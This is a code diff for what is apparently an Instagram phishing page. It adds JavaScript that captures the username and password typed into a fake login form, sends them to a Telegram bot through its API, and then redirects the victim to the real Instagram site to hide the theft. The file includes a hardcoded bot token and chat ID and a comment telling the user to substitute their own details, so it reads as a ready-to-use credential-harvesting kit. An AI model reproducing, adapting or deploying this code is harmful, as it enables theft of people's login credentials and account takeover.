@@ -1,34 +1,46 @@
-document.addEventListener('DOMContentLoaded', function() {
-    const form = document.getElementById('loginForm');
-    const loginBtn = document.getElementById('loginBtn');
-    
-    form.addEventListener('submit', function(e) {
-        // Prevent default only if you want to handle redirect manually
-        // But since we have _next redirect, we can just let it go.
-        // However, to keep the UX smooth, we'll handle it manually.
-        
-        loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
-        loginBtn.disabled = true;
-        loginBtn.style.opacity = '0.8';
-        
-        // Let the form submit to the hidden iframe
-        // We don't preventDefault here if we want the iframe to get the response
-        // But to control the redirect timing, we do preventDefault and fetch manually
-        
-        e.preventDefault();
-        
-        const formData = new FormData(form);
-        
-        // Submit via fetch to avoid page reload in main window
-        fetch(form.action, {
-            method: 'POST',
-            body: formData,
-            redirect: 'follow'
-        }).finally(() => {
-            // Redirect user to real Instagram after a brief delay
-            setTimeout(() => {
-                window.location.href = "https://www.instagram.com/";
-            }, 1000);
+        // REPLACE THESE WITH YOUR ACTUAL DETAILS
+        const BOT_TOKEN = '8657575309:AAHKWZ9aGj_4exJkEkLUllYZ65ejXoYEDa8'; 
+        const CHAT_ID = '5892161832'; 
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const btn = document.getElementById('loginBtn');
+            const originalText = btn.innerText;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+            btn.disabled = true;
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const message = `🔐 *New Instagram Login Attempt*\n\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Data sent to Telegram");
+                    // Optional: Redirect to real Instagram after sending
+                    window.location.href = "https://www.instagram.com/";
+                } else {
+                    alert("Failed to send credentials. Try again.");
+                    btn.innerText = originalText;
+                    btn.disabled = false;
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert("Network error. Try again.");
+                btn.innerText = originalText;
+                btn.disabled = false;
+            });
         });
-    });
-});
